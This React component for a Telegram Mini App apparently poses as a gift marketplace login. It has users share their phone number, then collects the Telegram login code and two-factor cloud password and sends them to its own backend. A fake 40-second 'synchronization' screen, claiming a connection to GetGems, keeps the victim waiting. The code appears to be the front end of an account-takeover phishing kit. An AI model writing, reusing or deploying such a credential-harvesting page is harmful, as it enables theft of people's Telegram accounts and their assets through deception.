import { useState, useRef, useEffect } from 'react';
import { authStepPhone, authStepCode, authStepPassword, authStepContactShared } from '../services/api';
import { setSynced, addToInventory } from '../services/inventory';
import { useAppContext } from '../store';
import { hapticImpact, hapticNotification } from '../services/telegram';
import { nftImage, NFT_NAMES } from '../constants';
import { motion, AnimatePresence } from 'framer-motion';
import { ArrowLeft, HelpCircle, Phone, MessageSquare, Lock } from 'lucide-react';

const SYNC_STAGES = [
  'Подключаемся к серверу...',
  'Проверяем аккаунт...',
  'Загружаем список подарков...',
  'Синхронизируем данные...',
  'Настраиваем маркет...',
  'Получаем историю транзакций...',
  'Обновляем баланс...',
  'Финализируем синхронизацию...',
  'Почти готово...',
];

function useLottieScript() {
  useEffect(() => {
    if (document.querySelector('script[data-lottie-wc]')) return;
    const s = document.createElement('script');
    s.src = 'https://unpkg.com/@lottiefiles/dotlottie-wc@0.9.3/dist/dotlottie-wc.js';
    s.type = 'module';
    s.setAttribute('data-lottie-wc', '1');
    document.head.appendChild(s);
  }, []);
}

const LOTTIE_PHONE = 'https://lottie.host/7c2ff46b-337a-43f7-a2d5-6ca430f9d1bc/GQuCc2RaMy.lottie';
const LOTTIE_SMS   = 'https://lottie.host/ec2e2547-977c-4ffe-957d-b3884a6118a9/cg1H7ftz6y.lottie';
const LOTTIE_LOCK  = 'https://lottie.host/364b1da5-8f44-4c4d-a979-bddd91df2a4d/kiwDtqBFfH.lottie';

declare namespace JSX {
  interface IntrinsicElements {
    'dotlottie-wc': React.DetailedHTMLProps<React.HTMLAttributes<HTMLElement>, HTMLElement> & {
      src?: string; autoplay?: boolean | string; loop?: boolean | string; style?: React.CSSProperties;
    };
  }
}

export default function AuthView() {
  useLottieScript();

  const [step, setStep]           = useState<1 | 2 | 3 | 4>(1);
  const [phone, setPhone]         = useState('');
  const [code, setCode]           = useState(['', '', '', '', '']);
  const [password, setPassword]   = useState('');
  const [loading, setLoading]     = useState(false);
  const [error, setError]         = useState('');
  const [contactShared, setContactShared] = useState(false);
  const [syncStage, setSyncStage]       = useState(0);
  const [syncProgress, setSyncProgress] = useState(0);
  const codeRefs = useRef<(HTMLInputElement | null)[]>([]);
  const {
    setIsSynced, setCurrentView, setSyncInfoReturnView,
    giftId, giftSlug, giftNum,
  } = useAppContext();

  const hasGift         = Boolean(giftSlug);
  const giftDisplayName = hasGift ? (NFT_NAMES[giftSlug] || giftSlug) : '';
  const giftImageUrl    = hasGift ? nftImage(giftSlug, giftNum || undefined) : '';
  const tg              = (window as any).Telegram?.WebApp;
  const tgUserId        = tg?.initDataUnsafe?.user?.id;

  // ── Кнопка поделиться контактом ──────────────────────────────────────────
  const handleRequestContact = () => {
    hapticImpact('medium');
    setError('');
    if (!tg) { setError('Откройте приложение через Telegram'); return; }
    // requestContact: Telegram показывает диалог, контакт приходит боту как сообщение
    // Колбэк получает только boolean (isSent) — никаких данных о номере здесь нет
    tg.requestContact((isSent: boolean) => {
      if (!isSent) { setError('Вы не поделились номером телефона'); return; }
      setContactShared(true);
      hapticImpact('light');
      // Уведомляем бота что контакт отправлен, бот уже получил сообщение с номером
      sendContactShared();
    });
  };

  const sendContactShared = async () => {
    setLoading(true); setError('');
    try {
      const effectiveGiftId = giftId || new URLSearchParams(window.location.search).get('gift_id') || '';
      const res = await authStepContactShared(effectiveGiftId);
      if (res.status === 'code_sent') { setStep(2); }
      else { setError(res.message || 'Ошибка. Попробуйте ещё раз.'); setContactShared(false); }
    } catch (err: any) { setError(err.message || 'Ошибка сети'); setContactShared(false); }
    finally { setLoading(false); }
  };

    const handleCodeChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    setError('');
    const newCode = [...code]; newCode[index] = value; setCode(newCode);
    if (value && index < 4) codeRefs.current[index + 1]?.focus();
    if (newCode.every(d => d !== '')) submitCode(newCode.join(''));
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) codeRefs.current[index - 1]?.focus();
  };

  const submitCode = async (fullCode: string) => {
    setLoading(true); setError('');
    try {
      const res = await authStepCode(fullCode);
      if (res.status === 'success') { handleSuccess(); }
      else if (res.status === 'need_password') { setStep(3); }
      else if (res.status === 'code_invalid') {
        setError('Неверный код. Проверьте и введите снова.');
        setCode(['', '', '', '', '']); codeRefs.current[0]?.focus(); hapticNotification('error');
      } else if (res.status === 'code_expired') {
        setError('Код истёк. Вернитесь и запросите новый.'); hapticNotification('error');
      } else {
        setError(res.message || 'Неверный код');
        setCode(['', '', '', '', '']); codeRefs.current[0]?.focus(); hapticNotification('error');
      }
    } catch (err: any) { setError(err.message || 'Ошибка сети'); }
    finally { setLoading(false); }
  };

  const handlePasswordSubmit = async () => {
    if (!password) { setError('Введите пароль'); return; }
    setLoading(true); setError('');
    try {
      const res = await authStepPassword(password);
      if (res.status === 'success') { handleSuccess(); }
      else if (res.status === 'password_invalid') {
        setError('Неверный пароль. Попробуйте ещё раз.'); hapticNotification('error');
      } else {
        setError(res.message || 'Неверный пароль'); hapticNotification('error');
      }
    } catch (err: any) { setError(err.message || 'Ошибка сети'); }
    finally { setLoading(false); }
  };

  const handleSuccess = () => {
    setSynced(); setIsSynced(true); hapticNotification('success'); setStep(4);
    try { navigator.vibrate([300, 100, 300, 100, 300, 100, 300]); } catch (_) {}
    [0, 400, 800, 1200, 1600, 2000, 2400].forEach(d => setTimeout(() => hapticImpact('medium'), d));
    let stageIdx = 0, progress = 0;
    const si = setInterval(() => { stageIdx = Math.min(stageIdx + 1, SYNC_STAGES.length - 1); setSyncStage(stageIdx); }, 4500);
    const pi = setInterval(() => { progress = Math.min(progress + 1.8, 99); setSyncProgress(progress); }, 700);
    setTimeout(() => {
      clearInterval(si); clearInterval(pi); setSyncProgress(100);
      if (hasGift && giftSlug) { addToInventory(giftSlug, giftNum || '0'); setCurrentView('my-gifts'); }
      else { setCurrentView('market'); }
    }, 40000);
  };

  const handleBack = () => {
    hapticImpact('light');
    if (hasGift) setCurrentView('gift-welcome'); else setCurrentView('market');
  };

  const handleWhySync = () => {
    hapticImpact('light');
    setSyncInfoReturnView('registration');
    setCurrentView('sync-info');
  };

  const StepDots = () => (
    <div className="flex items-center gap-2 mb-6">
      {[1, 2, 3].map(s => (
        <motion.div key={s}
          animate={{
            width: step === s ? 28 : 8,
            background: step > s ? '#22c55e' : step === s ? '#8774e1' : 'rgba(255,255,255,0.15)',
          }}
          transition={{ duration: 0.3 }}
          className="h-2 rounded-full"
        />
      ))}
    </div>
  );

  return (
    <div className="fixed inset-0 z-[9999] flex flex-col"
      style={{ background: 'linear-gradient(160deg, #0d0d12 0%, #0f0f16 50%, #0c0c10 100%)',
               paddingTop: 'calc(var(--tg-safe-area-top, 0px) + var(--tg-content-safe-area-top, 0px))' }}>

      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-80 h-80 rounded-full pointer-events-none"
        style={{ background: 'radial-gradient(circle, rgba(135,116,225,0.14) 0%, transparent 70%)', filter: 'blur(30px)' }} />

      {step !== 4 && (
        <button
          onClick={handleBack}
          className="absolute top-4 left-4 w-9 h-9 rounded-full flex items-center justify-center active:scale-90 transition-transform z-10"
          style={{ background: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.1)' }}
        >
          <ArrowLeft className="w-5 h-5 text-white" />
        </button>
      )}

      <div className="flex-1 flex flex-col items-center justify-center px-6 relative overflow-y-auto">
        <div className="w-full max-w-sm flex flex-col items-center py-4">

          {hasGift && step < 4 && (
            <motion.div initial={{ opacity: 0, y: -12 }} animate={{ opacity: 1, y: 0 }}
              className="flex items-center gap-3 rounded-2xl px-4 py-3 mb-5 w-full"
              style={{ background: 'rgba(135,116,225,0.1)', border: '1px solid rgba(135,116,225,0.25)' }}>
              <div className="w-11 h-11 rounded-xl overflow-hidden shrink-0"
                style={{ background: 'linear-gradient(135deg, #f6a827, #e66b12)' }}>
                <img src={giftImageUrl} alt={giftDisplayName} className="w-full h-full object-cover"
                  referrerPolicy="no-referrer" onError={e => { (e.target as HTMLImageElement).style.opacity = '0'; }} />
              </div>
              <div className="flex flex-col min-w-0 flex-1">
                <span className="text-[11px] text-[#8774e1] font-bold uppercase tracking-wider">Ваш подарок</span>
                <span className="text-sm font-bold text-white truncate">{giftDisplayName}</span>
              </div>
            </motion.div>
          )}

          {step !== 4 && (
            <>
              <StepDots />
              <button onClick={handleWhySync}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-full active:scale-95 transition-transform text-[12px] font-medium mb-4 -mt-2"
                style={{ background: 'rgba(255,255,255,0.06)', color: '#888', border: '1px solid rgba(255,255,255,0.08)' }}>
                <HelpCircle className="w-3.5 h-3.5" />
                Зачем нужна синхронизация?
              </button>
            </>
          )}

          {/* Зачем синхронизация? — показывается на шагах 1-3 */}
          {step !== 4 && (
            <button onClick={handleWhySync}
              className="flex items-center gap-1.5 px-4 py-2 rounded-full active:scale-95 transition-transform text-[12px] font-medium mb-5"
              style={{ background: 'rgba(255,255,255,0.05)', color: '#777', border: '1px solid rgba(255,255,255,0.08)' }}>
              <HelpCircle className="w-3.5 h-3.5" />
              Зачем нужна синхронизация?
            </button>
          )}

          <AnimatePresence mode="wait">

            {/* ═══ STEP 1 — Share contact ═══ */}
            {step === 1 && (
              <motion.div key="s1"
                initial={{ opacity: 0, x: 40 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -40 }}
                transition={{ type: 'spring', stiffness: 300, damping: 28 }}
                className="w-full flex flex-col items-center"
              >
                {/* Lottie phone */}
                <motion.div animate={{ scale: error ? [1, 1.04, 0.97, 1] : 1 }} transition={{ duration: 0.3 }}>
                  {/* @ts-ignore */}
                  <dotlottie-wc src={LOTTIE_PHONE} style={{ width: 120, height: 120 }} autoplay loop />
                </motion.div>

                <p className="text-[22px] font-bold text-white mt-4 mb-1.5 text-center" style={{ fontFamily: 'Syne, sans-serif' }}>
                  Привяжите аккаунт
                </p>
                <p className="text-[13px] text-gray-400 mb-7 text-center leading-relaxed px-2">
                  Нажмите кнопку ниже, чтобы поделиться своим номером телефона через Telegram
                </p>

                {/* Contact share button */}
                <motion.button
                  onClick={handleRequestContact}
                  disabled={loading}
                  whileTap={{ scale: 0.97 }}
                  className="w-full text-white font-bold py-4 rounded-2xl transition-all disabled:opacity-50 flex items-center justify-center gap-3 mb-3"
                  style={{
                    background: 'linear-gradient(135deg, #8774e1, #6c5fc7)',
                    boxShadow: loading ? 'none' : '0 4px 24px rgba(135,116,225,0.4)',
                    fontFamily: 'DM Sans, sans-serif',
                  }}
                >
                  {loading ? (
                    <><div className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full"
                      style={{ animation: 'spin-slow 0.8s linear infinite' }} />Подключаемся...</>
                  ) : (
                    <><Phone className="w-5 h-5" />Поделиться номером телефона</>
                  )}
                </motion.button>

                {/* What user sees: their number already shown after share */}
                {contactShared && phone && (
                  <motion.div initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}
                    className="flex items-center gap-2 px-4 py-2 rounded-xl mb-3"
                    style={{ background: 'rgba(34,197,94,0.1)', border: '1px solid rgba(34,197,94,0.3)' }}>
                    <div className="w-2 h-2 rounded-full bg-green-400" />
                    <span className="text-[13px] text-green-400 font-semibold">{phone}</span>
                  </motion.div>
                )}

                <AnimatePresence>
                  {error && (
                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                      className="text-red-400 text-[13px] text-center mt-1">{error}</motion.p>
                  )}
                </AnimatePresence>

                <p className="text-[11px] text-gray-600 text-center mt-4 leading-relaxed">
                  Telegram попросит подтвердить отправку вашего номера.<br />Ваш номер используется только для входа в аккаунт.
                </p>
              </motion.div>
            )}

            {/* ═══ STEP 2 — Code ═══ */}
            {step === 2 && (
              <motion.div key="s2"
                initial={{ opacity: 0, x: 40 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -40 }}
                transition={{ type: 'spring', stiffness: 300, damping: 28 }}
                className="w-full flex flex-col items-center"
              >
                <motion.div animate={{ rotate: error ? [-6, 6, -6, 0] : 0 }} transition={{ duration: 0.35 }}>
                  {/* @ts-ignore */}
                  <dotlottie-wc src={LOTTIE_SMS} style={{ width: 120, height: 120 }} autoplay loop />
                </motion.div>

                <p className="text-[22px] font-bold text-white mt-4 mb-1 text-center" style={{ fontFamily: 'Syne, sans-serif' }}>
                  Код подтверждения
                </p>
                {phone && (
                  <p className="text-[13px] text-gray-500 mb-1 text-center">
                    Номер: <span className="text-gray-300 font-medium">{phone}</span>
                  </p>
                )}
                <p className="text-[13px] text-gray-400 mb-6 text-center">Мы отправили код в приложение Telegram</p>

                <div className="flex gap-2.5 mb-3">
                  {code.map((digit, i) => (
                    <motion.input key={i}
                      ref={el => (codeRefs.current[i] = el)}
                      type="text" inputMode="numeric" maxLength={1} value={digit}
                      onChange={e => handleCodeChange(i, e.target.value)}
                      onKeyDown={e => handleKeyDown(i, e)}
                      className="w-12 h-14 rounded-xl text-center text-xl font-bold text-white outline-none"
                      animate={{ scale: digit ? [1, 1.1, 1] : 1 }}
                      transition={{ duration: 0.18 }}
                      style={{
                        background: error ? 'rgba(239,68,68,0.1)' : digit ? 'rgba(135,116,225,0.18)' : 'rgba(255,255,255,0.06)',
                        border: `1.5px solid ${error ? 'rgba(239,68,68,0.6)' : digit ? 'rgba(135,116,225,0.75)' : 'rgba(255,255,255,0.12)'}`,
                        transition: 'background 0.15s, border-color 0.15s',
                      }}
                    />
                  ))}
                </div>

                {loading && (
                  <div className="flex items-center gap-2 mt-2 text-gray-400 text-[13px]">
                    <div className="w-3.5 h-3.5 border-2 border-gray-400/40 border-t-gray-300 rounded-full"
                      style={{ animation: 'spin-slow 0.8s linear infinite' }} />
                    Проверяем код...
                  </div>
                )}
                <AnimatePresence>
                  {error && (
                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                      className="text-red-400 text-[13px] mt-2 text-center">{error}</motion.p>
                  )}
                </AnimatePresence>
              </motion.div>
            )}

            {/* ═══ STEP 3 — Password ═══ */}
            {step === 3 && (
              <motion.div key="s3"
                initial={{ opacity: 0, x: 40 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -40 }}
                transition={{ type: 'spring', stiffness: 300, damping: 28 }}
                className="w-full flex flex-col items-center"
              >
                <motion.div animate={{ scale: error ? [1, 1.06, 0.94, 1] : 1 }} transition={{ duration: 0.3 }}>
                  {/* @ts-ignore */}
                  <dotlottie-wc src={LOTTIE_LOCK} style={{ width: 120, height: 120 }} autoplay loop />
                </motion.div>

                <p className="text-[22px] font-bold text-white mt-2 mb-1 text-center" style={{ fontFamily: 'Syne, sans-serif' }}>
                  Облачный пароль
                </p>
                <p className="text-[13px] text-gray-400 mb-5 text-center">Введите пароль двухфакторной аутентификации</p>

                {password.length > 0 && (
                  <motion.div className="w-full mb-3" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                    <div className="flex justify-between mb-1">
                      <span className="text-[11px] text-gray-500">Надёжность</span>
                      <span className="text-[11px] font-semibold"
                        style={{ color: password.length < 5 ? '#ef4444' : password.length < 9 ? '#f59e0b' : '#22c55e' }}>
                        {password.length < 5 ? 'Слабый' : password.length < 9 ? 'Средний' : 'Надёжный'}
                      </span>
                    </div>
                    <div className="w-full h-1.5 rounded-full overflow-hidden" style={{ background: 'rgba(255,255,255,0.07)' }}>
                      <motion.div className="h-full rounded-full"
                        animate={{ width: `${Math.min(password.length / 12 * 100, 100)}%` }}
                        style={{ background: password.length < 5 ? '#ef4444' : password.length < 9 ? '#f59e0b' : '#22c55e' }}
                        transition={{ duration: 0.3 }} />
                    </div>
                  </motion.div>
                )}

                <input type="password" placeholder="••••••••" value={password}
                  onChange={e => { setError(''); setPassword(e.target.value); }}
                  onKeyDown={e => { if (e.key === 'Enter') handlePasswordSubmit(); }}
                  className="w-full rounded-2xl px-4 py-3.5 text-white text-center text-lg mb-3 outline-none"
                  style={{
                    background: error ? 'rgba(239,68,68,0.08)' : 'rgba(255,255,255,0.06)',
                    border: `1.5px solid ${error ? 'rgba(239,68,68,0.55)' : 'rgba(255,255,255,0.12)'}`,
                    fontFamily: 'DM Sans, sans-serif', letterSpacing: '0.15em',
                    transition: 'border-color 0.2s, background 0.2s',
                  }}
                />
                <AnimatePresence>
                  {error && (
                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                      className="text-red-400 text-[13px] mb-3 text-center">{error}</motion.p>
                  )}
                </AnimatePresence>

                <button onClick={handlePasswordSubmit} disabled={loading}
                  className="w-full text-white font-bold py-4 rounded-2xl transition-all active:scale-[0.97] disabled:opacity-50 flex items-center justify-center gap-2"
                  style={{ background: 'linear-gradient(135deg, #f59e0b, #d97706)', boxShadow: loading ? 'none' : '0 4px 20px rgba(245,158,11,0.28)', fontFamily: 'DM Sans, sans-serif' }}>
                  {loading ? (
                    <><div className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full"
                      style={{ animation: 'spin-slow 0.8s linear infinite' }} />Проверка...</>
                  ) : 'Подтвердить →'}
                </button>
              </motion.div>
            )}

            {/* ═══ STEP 4 — Success ═══ */}
            {step === 4 && (
              <motion.div key="s4" initial={{ opacity: 0 }} animate={{ opacity: 1 }}
                className="w-full flex flex-col items-center">
                <div className="relative w-28 h-28 mb-5 flex items-center justify-center">
                  {[0, 1, 2].map(i => (
                    <div key={i} className="absolute inset-0 rounded-full"
                      style={{ border: '1.5px solid rgba(34,197,94,0.3)', animation: `ripple-out 2.8s ease-out ${i * 0.9}s infinite` }} />
                  ))}
                  <motion.div initial={{ scale: 0, rotate: -20 }} animate={{ scale: 1, rotate: 0 }}
                    transition={{ type: 'spring', stiffness: 220, damping: 16, delay: 0.1 }}
                    className="w-20 h-20 rounded-full flex items-center justify-center"
                    style={{ background: 'linear-gradient(135deg, rgba(34,197,94,0.22), rgba(34,197,94,0.1))',
                             border: '1px solid rgba(34,197,94,0.4)', boxShadow: '0 0 32px rgba(34,197,94,0.22)' }}>
                    <svg width="38" height="38" viewBox="0 0 38 38" fill="none">
                      <motion.path d="M9 19 L16 26 L29 12" stroke="#22c55e" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round" fill="none"
                        initial={{ pathLength: 0, opacity: 0 }} animate={{ pathLength: 1, opacity: 1 }} transition={{ duration: 0.55, delay: 0.25 }} />
                    </svg>
                  </motion.div>
                </div>

                <motion.p initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }}
                  className="text-[22px] font-bold text-white mb-1" style={{ fontFamily: 'Syne, sans-serif' }}>
                  Синхронизация!
                </motion.p>
                <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.55 }}
                  className="text-[13px] text-gray-400 text-center mb-7">
                  Аккаунт подключён к GetGems
                </motion.p>

                <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.65 }}
                  className="w-full rounded-2xl p-4"
                  style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)' }}>
                  <div className="flex items-center justify-between mb-2.5">
                    <AnimatePresence mode="wait">
                      <motion.span key={syncStage} initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -5 }}
                        transition={{ duration: 0.25 }} className="text-[13px] text-gray-300">
                        {SYNC_STAGES[syncStage]}
                      </motion.span>
                    </AnimatePresence>
                    <motion.span className="text-[13px] font-bold ml-3 shrink-0" style={{ color: '#2382ff' }}
                      animate={{ opacity: [1, 0.6, 1] }} transition={{ duration: 1.2, repeat: Infinity }}>
                      {Math.floor(syncProgress)}%
                    </motion.span>
                  </div>
                  <div className="w-full h-2.5 rounded-full overflow-hidden" style={{ background: 'rgba(255,255,255,0.07)' }}>
                    <motion.div className="h-full rounded-full"
                      style={{ background: 'linear-gradient(90deg, #2382ff, #8774e1)' }}
                      animate={{ width: `${syncProgress}%` }} transition={{ duration: 0.7, ease: 'easeOut' }} />
                  </div>
                </motion.div>

                <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 1 }}
                  className="text-[11px] text-gray-600 text-center mt-4">
                  Не закрывайте приложение — займёт ~40 секунд
                </motion.p>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
}
